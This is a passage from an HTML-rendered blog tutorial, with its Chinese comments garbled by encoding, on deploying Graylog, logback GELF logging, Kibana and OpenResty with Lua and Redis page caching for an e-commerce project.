class="line">      <span class="bullet">-</span> <span class="string">GRAYLOG_ROOT_PASSWORD_SHA2=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">GRAYLOG_HTTP_EXTERNAL_URI=http://106.14.29.182:9000/</span></span><br><span class="line">    <span class="attr">entrypoint:</span> <span class="string">/usr/bin/tini</span> <span class="string">--</span> <span class="string">wait-for-it</span> <span class="string">elasticsearch:9200</span> <span class="string">--</span>  <span class="string">/docker-entrypoint.sh</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">graylog</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mongo</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">elasticsearch</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="comment"># Graylog web interface and REST API</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9000</span><span class="string">:9000</span></span><br><span class="line">      <span class="comment"># Syslog TCP</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">1514</span><span class="string">:1514</span></span><br><span class="line">      <span class="comment"># Syslog UDP</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">1514</span><span class="string">:1514/udp</span></span><br><span class="line">      <span class="comment"># GELF TCP</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">12201</span><span class="string">:12201</span></span><br><span class="line">      <span class="comment"># GELF UDP</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">12201</span><span class="string">:12201/udp</span></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">graylog:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>biz.paluch.logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logstash-gelf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.13.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CONSOLE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span></span><br><span class="line">                %d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n</span><br><span class="line">            <span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;GELF&quot;</span> <span class="attr">class</span>=<span class="string">&quot;biz.paluch.logging.gelf.logback.GelfLogbackAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--GrayLogæœåŠ¡åœ°å€--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">host</span>&gt;</span>udp:10.211.55.26<span class="tag">&lt;/<span class="name">host</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--GrayLogæœåŠ¡ç«¯å£--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">port</span>&gt;</span>12201<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--å½“å‰æœåŠ¡åç§°--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">facility</span>&gt;</span>ly-registry<span class="tag">&lt;/<span class="name">facility</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">extractStackTrace</span>&gt;</span>true<span class="tag">&lt;/<span class="name">extractStackTrace</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filterStackTrace</span>&gt;</span>true<span class="tag">&lt;/<span class="name">filterStackTrace</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mdcProfiling</span>&gt;</span>true<span class="tag">&lt;/<span class="name">mdcProfiling</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">timestampPattern</span>&gt;</span>yyyy-MM-dd HH:mm:ss,SSS<span class="tag">&lt;/<span class="name">timestampPattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maximumMessageSize</span>&gt;</span>8192<span class="tag">&lt;/<span class="name">maximumMessageSize</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;com.leyou&quot;</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span> <span class="attr">additivity</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CONSOLE&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;GELF&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CONSOLE&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;GELF&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">æˆåŠŸ</span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>de.siegmar<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-gelf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- é…ç½®æ§åˆ¶å°çš„è¾“å‡ºæ—¥å¿— --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;consoleLog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.encoder.LayoutWrappingEncoder&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- å®šä¹‰æ—¥å¿—è¾“å‡ºçš„æ ¼å¼ --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">layout</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.classic.PatternLayout&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pattern</span>&gt;</span></span><br><span class="line">                    %d - [%thread] %-5level %logger&#123;35&#125; - [%line] - %msg%n</span><br><span class="line">                <span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- é…ç½®æ—¥å¿—è¾“å‡ºåˆ°GraylogæœåŠ¡ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;GELF&quot;</span> <span class="attr">class</span>=<span class="string">&quot;de.siegmar.logbackgelf.GelfUdpAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- GraylogæœåŠ¡çš„åœ°å€ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">graylogHost</span>&gt;</span>ly-graylog<span class="tag">&lt;/<span class="name">graylogHost</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- UDP Inputç«¯å£ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">graylogPort</span>&gt;</span>12201<span class="tag">&lt;/<span class="name">graylogPort</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- æœ€å¤§GELFæ•°æ®å—å¤§å°ï¼ˆå•ä½ï¼šå­—èŠ‚ï¼‰ï¼Œ508ä¸ºå»ºè®®æœ€å°å€¼ï¼Œæœ€å¤§å€¼ä¸º65467 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maxChunkSize</span>&gt;</span>508<span class="tag">&lt;/<span class="name">maxChunkSize</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- æ˜¯å¦ä½¿ç”¨å‹ç¼© --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">useCompression</span>&gt;</span>true<span class="tag">&lt;/<span class="name">useCompression</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">class</span>=<span class="string">&quot;de.siegmar.logbackgelf.GelfEncoder&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- æ˜¯å¦å‘é€åŸç”Ÿçš„æ—¥å¿—ä¿¡æ¯ --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includeRawMessage</span>&gt;</span>false<span class="tag">&lt;/<span class="name">includeRawMessage</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includeMarker</span>&gt;</span>true<span class="tag">&lt;/<span class="name">includeMarker</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includeMdcData</span>&gt;</span>true<span class="tag">&lt;/<span class="name">includeMdcData</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includeCallerData</span>&gt;</span>false<span class="tag">&lt;/<span class="name">includeCallerData</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includeRootCauseData</span>&gt;</span>false<span class="tag">&lt;/<span class="name">includeRootCauseData</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- æ˜¯å¦å‘é€æ—¥å¿—çº§åˆ«çš„åç§°ï¼Œå¦åˆ™é»˜è®¤ä»¥æ•°å­—ä»£è¡¨æ—¥å¿—çº§åˆ« --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includeLevelName</span>&gt;</span>true<span class="tag">&lt;/<span class="name">includeLevelName</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">shortPatternLayout</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.classic.PatternLayout&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%m%nopex<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">shortPatternLayout</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fullPatternLayout</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.classic.PatternLayout&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d - [%thread] %-5level %logger&#123;35&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fullPatternLayout</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- é…ç½®åº”ç”¨åç§°ï¼ˆæœåŠ¡åç§°ï¼‰ï¼Œé€šè¿‡staticFieldæ ‡ç­¾å¯ä»¥è‡ªå®šä¹‰ä¸€äº›å›ºå®šçš„æ—¥å¿—å­—æ®µ --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">staticField</span>&gt;</span>app_name:ly-registry<span class="tag">&lt;/<span class="name">staticField</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">staticField</span>&gt;</span>os_arch:$&#123;os.arch&#125;<span class="tag">&lt;/<span class="name">staticField</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">staticField</span>&gt;</span>os_name:$&#123;os.name&#125;<span class="tag">&lt;/<span class="name">staticField</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">staticField</span>&gt;</span>os_version:$&#123;os.version&#125;<span class="tag">&lt;/<span class="name">staticField</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;GELF&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;consoleLog&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="kibana-å¤±è´¥"><a href="#kibana-å¤±è´¥" class="headerlink" title="kibana(å¤±è´¥)"></a>kibana(å¤±è´¥)</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/leyou</span><br><span class="line">tar -zxvf kibana-7.4.2-linux-x86_64.tar.gz</span><br><span class="line"><span class="built_in">cd</span> kibana-7.4.2-linux-x86_64/config</span><br><span class="line">vi kibana.yml</span><br><span class="line">æ‰“å¼€ç«¯å£</span><br><span class="line">server.host: <span class="string">&quot;0.0.0.0&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149305.png" alt="img"></p>
<p>å¯åŠ¨</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chown</span> -R leyou /home/leyou/kibana-7.4.2-linux-x86_64 <span class="comment">#åœ¨rootä¸‹èµ‹äºˆæƒé™</span></span><br><span class="line">su leyou <span class="comment">#åˆ‡æ¢ä¸ºleyouç”¨æˆ·</span></span><br><span class="line"><span class="built_in">cd</span> /home/leyou/kibana-7.4.2-linux-x86_64</span><br><span class="line">bin/kibana</span><br><span class="line"></span><br><span class="line"><span class="comment">#åå°å¯åŠ¨</span></span><br><span class="line"><span class="built_in">nohup</span> bin/kibana &amp; </span><br><span class="line"></span><br><span class="line"><span class="comment">#ç«¯å£5601</span></span><br></pre></td></tr></table></figure>

<h2 id="å®‰è£…Openresty"><a href="#å®‰è£…Openresty" class="headerlink" title="å®‰è£…Openresty"></a>å®‰è£…Openresty</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">å®‰è£…OpenRestyçš„ä¾èµ–å¼€å‘åº“</span></span><br><span class="line">yum install -y pcre-devel openssl-devel gcc curl</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å®‰è£…OpenRestyä»“åº“</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœ¨CentOS ç³»ç»Ÿä¸­æ·»åŠ  `openresty` ä»“åº“ï¼Œè¿™æ ·å°±å¯ä»¥ä¾¿äºæœªæ¥å®‰è£…æˆ–æ›´æ–°æˆ‘ä»¬çš„è½¯ä»¶åŒ…ï¼ˆé€šè¿‡ `yum check-update` å‘½ä»¤ï¼‰ã€‚è¿è¡Œä¸‹é¢çš„å‘½ä»¤å°±å¯ä»¥æ·»åŠ æˆ‘ä»¬çš„ä»“åº“</span></span><br><span class="line">yum install -y yum-utils</span><br><span class="line">yum-config-manager --add-repo https://openresty.org/package/centos/openresty.repo</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å®‰è£…openresty</span></span><br><span class="line">yum install -y openresty</span><br><span class="line"><span class="meta">#</span><span class="language-bash">opmæ˜¯OpenRestyçš„ä¸€ä¸ªç®¡ç†å·¥å…·ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬å®‰è£…ä¸€ä¸ªç¬¬ä¸‰æ–¹çš„Luaæ¨¡å—ã€‚</span></span><br><span class="line">yum install -y openresty-opm</span><br><span class="line"></span><br><span class="line">vi /etc/profile</span><br><span class="line">export NGINX_HOME=/usr/local/openresty/nginx</span><br><span class="line">export PATH=$&#123;NGINX_HOME&#125;/sbin:$PATH</span><br><span class="line">source /etc/profile</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ¨¡æ¿æ¸²æŸ“ç»„ä»¶å¹¶ä¸æ˜¯OpenRestyè‡ªå¸¦çš„ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±æ¥å®‰è£…ã€‚</span></span><br><span class="line">opm get bungle/lua-resty-template</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cd /usr/resty</span><br><span class="line">mkdir templates</span><br><span class="line"></span><br><span class="line">vi /usr/resty/conf/nginx.conf</span><br><span class="line">worker_processes  1;</span><br><span class="line">error_log logs/error.log;</span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections 1024;</span><br><span class="line">&#125;</span><br><span class="line">http &#123;</span><br><span class="line">    lua_package_path &quot;/usr/local/openresty/lualib/?.lua;;&quot;;  #lua æ¨¡å—</span><br><span class="line">    lua_package_cpath &quot;/usr/local/openresty/lualib/?.so;;&quot;;  #cæ¨¡å—</span><br><span class="line">    lua_shared_dict item_local_cache 50m; #å…±äº«å…¨å±€å˜é‡ï¼Œåœ¨æ‰€æœ‰workeré—´å…±äº«</span><br><span class="line"></span><br><span class="line">    default_type  text/html; # é»˜è®¤å“åº”ç±»å‹æ˜¯html</span><br><span class="line">    include leyou.conf;    # å¼•å…¥ä¸€ä¸ªlua.confæ–‡ä»¶</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vi /usr/resty/conf/leyou.conf</span><br><span class="line">upstream backend &#123;</span><br><span class="line"><span class="meta">		#</span><span class="language-bash">page	çš„æœåŠ¡åœ°å€</span></span><br><span class="line">    server ly-page1:8084 max_fails=5 fail_timeout=5s weight=1;</span><br><span class="line">    server ly-page2:8084 max_fails=5 fail_timeout=5s weight=1;</span><br><span class="line">    keepalive 100;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">        set $template_root &quot;/usr/resty/templates&quot;;</span><br><span class="line"></span><br><span class="line">    location ~ /backend/(.*) &#123;</span><br><span class="line">        #internal;</span><br><span class="line">        keepalive_timeout   30s;</span><br><span class="line">        keepalive_requests  1000;</span><br><span class="line">        #æ”¯æŒkeep-alive</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Connection &quot;&quot;;</span><br><span class="line"><span class="meta">  #</span><span class="language-bash">å°†è·¯å¾„é‡å†™ä¸ºç¬¬ä¸€ä¸ªæ­£åˆ™æ•è·åˆ°çš„è·¯å¾„  /xxx/xxx</span></span><br><span class="line">        rewrite /backend(/.*) $1 break;</span><br><span class="line">        proxy_pass_request_headers off;</span><br><span class="line">        #more_clear_input_headers Accept-Encoding;</span><br><span class="line">        proxy_next_upstream error timeout;</span><br><span class="line">        proxy_pass http://backend;</span><br><span class="line">    &#125;</span><br><span class="line">   location ~ /item/(\d+).html$ &#123;</span><br><span class="line">    # è·å–è·¯å¾„å‚æ•°</span><br><span class="line">    set $spuId $1;</span><br><span class="line">    # ç¦æ­¢é™¤äº†www.wl9939.topä»¥å¤–çš„è¯·æ±‚è®¿é—®</span><br><span class="line">    #if ($host !~ &quot;^www\.wl9939\.top$&quot;) &#123;</span><br><span class="line">        #return 403;</span><br><span class="line">    #&#125;</span><br><span class="line">    # å…³é—­ç¼“å­˜/æ‰“å¼€ç¼“å­˜</span><br><span class="line">    lua_code_cache on;</span><br><span class="line">    default_type &#x27;text/html&#x27;;</span><br><span class="line">    charset utf-8;</span><br><span class="line">    # æŒ‡å®šè¯·æ±‚äº¤ç»™lua/item.luaè„šæœ¬æ¥å¤„ç†</span><br><span class="line">    content_by_lua_file lua/item.lua;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vi /etc/hosts</span><br><span class="line">192.168.58.76 ly-page1</span><br><span class="line">192.168.58.153 ly-page2</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç¼–å†™ä¸€ä¸ªé€šç”¨çš„å·¥å…·æ¨¡å—ï¼Œæ–¹ä¾¿åæœŸè¿æ¥Redisï¼ŒæŸ¥è¯¢tomcatè„šæœ¬è¦å®šä¹‰åˆ°`/usr/local/openresty/lualib`ç›®å½•ï¼Œå› ä¸ºè¿™é‡Œçš„luaä¼šè¢«æ‰«æåˆ°æ¨¡å—åº“ï¼Œä¾›å…¶å®ƒè„šæœ¬å…±äº«ä½¿ç”¨ã€‚</span></span><br><span class="line">vi /usr/local/openresty/lualib/common.lua</span><br><span class="line">-- å¯¼å…¥redisæ¨¡å—</span><br><span class="line">local redis = require(&quot;resty.redis&quot;) </span><br><span class="line">-- é…ç½®å•†å“çš„æœ¬åœ°ç¼“å­˜ </span><br><span class="line">local local_cache = ngx.shared.item_local_cache</span><br><span class="line">-- æ—¥å¿—</span><br><span class="line">local ngx_log = ngx.log  </span><br><span class="line">local ngx_ERR = ngx.ERR</span><br><span class="line">-- è¯»å–æœ¬åœ°ç¼“å­˜</span><br><span class="line">local function cache_get(key)  </span><br><span class="line">    if not local_cache then  </span><br><span class="line">        return nil  </span><br><span class="line">    end  </span><br><span class="line">    return local_cache:get(key)  </span><br><span class="line">end</span><br><span class="line">-- å†™å…¥æœ¬åœ°ç¼“å­˜</span><br><span class="line">local function cache_set(key, value)  </span><br><span class="line">    if not local_cache then  </span><br><span class="line">        return nil  </span><br><span class="line">    end  </span><br><span class="line">    return local_cache:set(key, value, 10 * 60) --10åˆ†é’Ÿ  </span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">local function close_redis(red)  </span><br><span class="line">    if not red then  </span><br><span class="line">        return  </span><br><span class="line">    end  </span><br><span class="line">    --é‡Šæ”¾è¿æ¥(è¿æ¥æ± å®ç°)  </span><br><span class="line">    local pool_max_idle_time = 10000 --æ¯«ç§’  </span><br><span class="line">    local pool_size = 100 --è¿æ¥æ± å¤§å°  </span><br><span class="line">    local ok, err = red:set_keepalive(pool_max_idle_time, pool_size)  </span><br><span class="line">  </span><br><span class="line">    if not ok then  </span><br><span class="line">        ngx_log(ngx_ERR, &quot;set redis keepalive error : &quot;, err)  </span><br><span class="line">    end  </span><br><span class="line">end  </span><br><span class="line">-- æŸ¥è¯¢æœ¬åœ°ç¼“å­˜ï¼Œæ²¡æœ‰åˆ™æŸ¥è¯¢redis, ipå’Œportæ˜¯redisåœ°å€ï¼Œkeyæ˜¯æŸ¥è¯¢çš„key</span><br><span class="line">local function read_cache(ip, port, key) </span><br><span class="line">	-- å°è¯•è¯»æœ¬åœ°ç¼“å­˜</span><br><span class="line">	local resp = cache_get(key)</span><br><span class="line">	-- ngx_log(ngx_ERR, &quot;debug local cache data : &quot;, resp) </span><br><span class="line">	if not resp then</span><br><span class="line">		ngx_log(ngx_ERR, &quot;read local cache fail , key&quot;, key)</span><br><span class="line">		-- è·å–ä¸€ä¸ªredisè¿æ¥</span><br><span class="line">		local red = redis:new()  </span><br><span class="line">		red:set_timeout(1000)  </span><br><span class="line">		local ok, err = red:connect(ip, port)  </span><br><span class="line">		if not ok then  </span><br><span class="line">			ngx_log(ngx_ERR, &quot;connect to redis error : &quot;, err)  </span><br><span class="line">			return close_redis(red)  </span><br><span class="line">		end</span><br><span class="line">		-- åˆ©ç”¨getæŸ¥è¯¢</span><br><span class="line">		resp, err = red:get(key) </span><br><span class="line">	end</span><br><span class="line">	-- æŸ¥è¯¢å¤±è´¥å¤„ç†</span><br><span class="line">    if not resp then  </span><br><span class="line">        ngx_log(ngx_ERR, &quot;get redis content error : &quot;, err)  </span><br><span class="line">        return close_redis(red)  </span><br><span class="line">    end  </span><br><span class="line">  </span><br><span class="line">    --å¾—åˆ°çš„æ•°æ®ä¸ºç©ºå¤„ç†  </span><br><span class="line">    if resp == ngx.null then  </span><br><span class="line">        resp = nil  </span><br><span class="line">    end</span><br><span class="line">	cache_set(key, resp)</span><br><span class="line">    close_redis(red)  </span><br><span class="line">    return resp  </span><br><span class="line">end</span><br><span class="line">-- æŸ¥è¯¢redisçš„æ–¹æ³• ipå’Œportæ˜¯redisåœ°å€ï¼Œkeysæ˜¯æŸ¥è¯¢çš„keyï¼Œæ•°ç»„æ ¼å¼</span><br><span class="line">local function read_redis(ip, port, key)  </span><br><span class="line">	-- è·å–ä¸€ä¸ªè¿æ¥</span><br><span class="line">    local red = redis:new()  </span><br><span class="line">    red:set_timeout(1000)  </span><br><span class="line">    local ok, err = red:connect(ip, port)  </span><br><span class="line">    if not ok then  </span><br><span class="line">        ngx_log(ngx_ERR, &quot;connect to redis error : &quot;, err)  </span><br><span class="line">        return close_redis(red)  </span><br><span class="line">    end  </span><br><span class="line">    local resp = nil</span><br><span class="line">	-- åˆ©ç”¨getæŸ¥è¯¢ </span><br><span class="line">    resp, err = red:get(key)  </span><br><span class="line">	-- æŸ¥è¯¢å¤±è´¥å¤„ç†</span><br><span class="line">    if not resp then  </span><br><span class="line">        ngx_log(ngx_ERR, &quot;get redis content error : &quot;, err)  </span><br><span class="line">        return close_redis(red)  </span><br><span class="line">    end  </span><br><span class="line">  </span><br><span class="line">    --å¾—åˆ°çš„æ•°æ®ä¸ºç©ºå¤„ç†  </span><br><span class="line">    if resp == ngx.null then  </span><br><span class="line">        resp = nil  </span><br><span class="line">    end  </span><br><span class="line">    close_redis(red)  </span><br><span class="line">    return resp  </span><br><span class="line">end </span><br><span class="line">-- æŸ¥è¯¢httpè¯·æ±‚çš„æ–¹æ³•ï¼Œpathæ˜¯è¯·æ±‚è·¯å¾„ï¼Œargsæ˜¯å‚æ•°ï¼Œtableæ ¼å¼</span><br><span class="line">local function read_http(path, args) </span><br><span class="line">	-- é»˜è®¤æŸ¥è¯¢åœ°å€èµ° /backend/page/,å†…éƒ¨è½¬å‘åˆ°8083ç«¯å£</span><br><span class="line">    local resp = ngx.location.capture(&quot;/backend/page&quot;..path, &#123;  </span><br><span class="line">        method = ngx.HTTP_GET,  </span><br><span class="line">        args = args  </span><br><span class="line">    &#125;)  </span><br><span class="line">	-- æŸ¥è¯¢å¤±è´¥çš„å¤„ç†</span><br><span class="line">    if not resp then  </span><br><span class="line">        ngx_log(ngx_ERR, &quot;request error&quot;)  </span><br><span class="line">        return  </span><br><span class="line">    end</span><br><span class="line">	-- è¿”å›çŠ¶æ€ç ä¸æ˜¯200å°±æŠ¥é”™</span><br><span class="line">    if resp.status ~= 200 then  </span><br><span class="line">        ngx_log(ngx_ERR, &quot;request error, status :&quot;, resp.status)  </span><br><span class="line">        return  </span><br><span class="line">    end</span><br><span class="line">    return resp.body  </span><br><span class="line">end  </span><br><span class="line">-- å°†æ–¹æ³•å¯¼å‡º</span><br><span class="line">local _M = &#123;  </span><br><span class="line">    read_redis = read_redis,  </span><br><span class="line">    read_cache = read_cache,  </span><br><span class="line">    read_http = read_http  </span><br><span class="line">&#125;  </span><br><span class="line">return _M </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é¡µé¢æ¨¡ç‰ˆ</span></span><br><span class="line">vi /usr/resty/lua/item.lua</span><br><span class="line">-- å¯¼å…¥æ¨¡å—</span><br><span class="line">local common = require(&quot;common&quot;)</span><br><span class="line">local read_redis = common.read_redis  </span><br><span class="line">local read_http = common.read_http</span><br><span class="line">local read_cache = common.read_cache</span><br><span class="line">local cjson = require(&quot;cjson&quot;)</span><br><span class="line">local template = require(&quot;resty.template&quot;)  </span><br><span class="line">-- 